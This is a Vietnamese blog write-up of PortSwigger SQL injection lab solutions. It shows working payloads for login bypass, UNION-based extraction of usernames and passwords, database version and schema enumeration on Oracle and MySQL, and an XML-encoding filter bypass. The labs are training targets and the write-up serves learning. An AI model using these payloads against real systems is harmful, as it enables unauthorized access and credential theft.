---
title: SQL Injection Labs
date: '2022-12-24'
tags: ['porswigger', 'sql', 'injection','sqlinjection']
draft: false
summary: Writeups cua SQL Injection Labs.
images: ['/static/images/ccna/cisco.jpg']
author: ['default']
---
**[1.SQL injection vulnerability in WHERE clause allowing retrieval of hidden data](https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data)**

- Ta thấy lệnh ```filter?``` sẽ truy xuất dữ liệu. Dùng ```filter?category=Pets'+or+1=1--'``` sẽ hiện ra toàn bộ thông tin sản phẩm.

**[2.SQL injection vulnerability allowing login bypass](https://portswigger.net/web-security/sql-injection/lab-login-bypass)**

![image](https://user-images.githubusercontent.com/61643034/209037070-e5b60413-e259-47d7-9a2d-28b3c433fc0f.png)
- Sử dụng Burp Suite để chặn và sửa đổi yêu cầu đăng nhập.
- Sửa đổi tham số, cung cấp cho nó giá trị: ```usernameadministrator'--```

**[3.SQL injection UNION attack, determining the number of columns returned by the query](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)**
- Mục đích của bài này là xác định số trường của query.
- Theo gợi ý thấy chèn sau category=? 1 đoạn ```'+UNION+SELECT+NULL,NULL--```
- Kết quả trả về là internal server -> thừa hoặc thiếu số lượng trường trong bảng -> thêm 1 trường vào -> query trở thành ```filter?category=Pets'+UNION+SELECT+NULL,NULL,NULL-- ```

**[4.SQL injection UNION attack, finding a column containing text ](https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text)**

- Bài này không chỉ cần xác định số trường của query mà còn cả vị trí của text string nữa.
- Cùng 1 trang web query nên ta biết chắc query này cũng sẽ có 3 cột
- Thử payload ```'+UNION+SELECT+'a',NULL,NULL--``` -> màn hình hiện lên bắt nhập string bắt buộc là ```'QCQTlQ'``` -> Enter
- Vẫn bị lỗi internal server -> thử vị trí của string thành cột 2, hoặc 3 -> ```'+UNION+SELECT+NULL,'QCQTlQ',NULL--``` -> done

**[5.SQL injection UNION attack, retrieving data from other tables](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables)**

- Theo mô tả, ta thấy trong database có bảng khác tên là users và bảng này có 2 cột ```username``` và ```password```.
- Thử payload ```'+UNION+SELECT+'a','a'--``` -> Lăn xuống thấy trả về 2 string ***a***
- Thay thành ```'+UNION+SELECT+'username','password'--```
- Màn hình sẽ show ra nhiều hàng hiển thị nhiều tài khoản -> lọc lại thấy có tài khoản ```administrator```
![image](https://user-images.githubusercontent.com/61643034/209432735-55ce8a1f-04e6-4e5b-8a47-04a90503dbaf.png)
 
 -> Click vào trang login -> nhập username và password và -> done
 
 **[6.SQL injection UNION attack, retrieving multiple values in a single column](https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-multiple-values-in-single-column)**

- Tương tự 3.3,thử payload ```'+UNION+SELECT+NULL,username||'~'||password+FROM+users--``` 
![image](https://user-images.githubusercontent.com/61643034/209439384-7f5fc4e3-81c4-4312-8821-80c683513ebf.png)

 -> Click vào trang login -> nhập username và password và -> done
 
 **[7.SQL injection attack, querying the database type and version on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)**

- Thử payload ```'+UNION+SELECT+'a',+NULL+FROM+v$version--``` 
- Thông tin của Oracle sẽ hiện ra và done!

 **[8.SQL injection attack, querying the database type and version on MySQL and Microsoft](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft)**

- Bài này sau 1 hồi nghiên cứu mình phải dùng Repeater của Burpsuite để thực hành
- Trong gợi ý có payload ```'+UNION+SELECT+@@version,+NULL#``` đây là payload dùng để show version -> sau đó có được version ```'8.0.31-0ubuntu0.20.04.2'``` thì thay ```@@version``` thành version vừa kiếm được. Vậy là xong rồi ^^

**[9.SQL injection attack, listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)**

- Bài này sau 1 hồi nghiên cứu mình phải dùng Repeater của Burpsuite để thực hành
- Trong gợi ý có payload ```'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--``` đây là payload dùng để show tên các table có trong database, chúng ta sẽ cần nó để tìm tới table chứa ``user `` rồi thấy có 1 table tên là ```users_gwglpg``` rất khả nghi =)))
- Thử truy xuất dữ liệu xem có gì nào. Sửa pay load lại 1 xíu thành ```'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_gwglpg'--``` -> ta được ```username_jsoxhc``` và ```password_tppahp```
- Giờ cùng dùng payload cuối nào ```'+UNION+SELECT+username_jsoxhc,+password_tppahp+FROM+users_gwglpg--``` 
![image](https://user-images.githubusercontent.com/61643034/209443750-96e84f6a-b582-40ce-8796-4383a022bdf8.png)

- Vào ***My Account*** rồi login với tài khoản admin trên là xong =)))

**[10.SQL injection attack, listing the database contents on Oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle)**

- Dùng payload ```'+UNION+SELECT+'abc','def'+FROM+dual--``` -> hiện ra list bảng thấy có bảng user đặc biệt
![image](https://user-images.githubusercontent.com/61643034/209445285-0d03af36-06d8-4c80-be92-c6ebd47be4e1.png)
- Giờ có user -> đổi payload thành ```'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_VODNEC'--``` (vì mình để lab lâu nên nó tự đổi tên user_name :> )
![image](https://user-images.githubusercontent.com/61643034/209446011-b155badb-1b25-4d34-bb21-c5c50d1d4875.png)
- Tiếp có username và password -> đổi payload thành như sau ```'+UNION+SELECT+USERNAME_VGBMEN,PASSWORD_BDEQAY+FROM+USERS_VODNEC--```
![image](https://user-images.githubusercontent.com/61643034/209446101-873b06f6-415e-42e4-b36d-0345d5af381e.png)
- Bây giờ chỉ login vào nữa :> 

**[11.Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)**
- 

**[17.SQL injection with filter bypass via XML encoding](https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding)
![image](https://user-images.githubusercontent.com/61643034/209040423-3270052e-3a07-4225-9431-70a5c5d6b9cc.png)**

- Truy cập trang web, ở burpsuite, bật interception on
- Bấm vào ```check``` -> vào check request trả về
- Trong request có trường ```storeID``` -> sửa thành ```1+1``` -> trả về 144 unit -> bằng với storeID=2
- Nhập 1 lệnh attack vào giữa cặp ```<storeID>``` -> trả về attack detected -> bị block
  ![image](https://user-images.githubusercontent.com/61643034/209041177-ab4fe22c-2342-451b-aa22-872c072242b4.png)
- Bây giờ vào extension -> cài Hackvertor -> vào encode -> dec_entries -> dán ```<@dec_entities>1 UNION SELECT username || '~' || password FROM users<@/dec_entities>``` vào được output -> copy thả lại vào cặp thẻ ```<storeID>```.
![image](https://user-images.githubusercontent.com/61643034/209444081-694a1c38-9abc-4c49-9bcc-7a908e80d23d.png)
 Và bbooms
![image](https://user-images.githubusercontent.com/61643034/209042766-d1661308-9cbb-42c4-9651-58ebde6e0c14.png)
- Bây giờ, chỉ cần login nữa là xong rồi ^^
